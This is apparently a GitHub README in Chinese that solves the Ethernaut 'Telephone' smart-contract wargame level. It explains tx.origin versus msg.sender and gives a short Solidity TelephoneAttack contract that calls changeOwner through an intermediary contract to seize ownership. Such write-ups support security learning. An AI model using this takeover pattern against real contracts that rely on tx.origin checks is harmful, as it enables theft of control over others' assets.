# Ethernaut-Telephone
Ethernaut Telephone關卡的解法

<img width="1594" height="606" alt="image" src="https://github.com/user-attachments/assets/c8f47dff-6320-4732-891b-8e8254acb9b2" />

****這主要是在解釋tx.origin跟msg.sender兩者之間的關係****

tx.origin：永遠是發起這筆交易的外部帳號 (EOA)，無論經過多少層合約呼叫都不變

msg.sender:則是當前這一層函式呼叫的直接呼叫者，A呼叫Ｂ，Ｂ呼叫Ｃ，那Ｂ的msg.sender就是Ａ，Ｃ的msg.sender就是Ｂ

解題思路：
如果要取得Owner，就必須使呼叫changeOwner()的人不能是自己(tx.origin)，所以先部署合約TelephoneAttack，並呼叫attack()，這樣一來呼叫的人就從自己變成部署的合約了，就能通過圖片的if邏輯獲取Owner。


⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇⬇


// SPDX-License-Identifier: MIT 

pragma solidity ^0.8.13;

interface ITelephone {

    function changeOwner(address _owner) external;
    
}


contract TelephoneAttack {

    function attack(address telephone) external {
    
        ITelephone(telephone).changeOwner(msg.sender);
        
    }
    
}



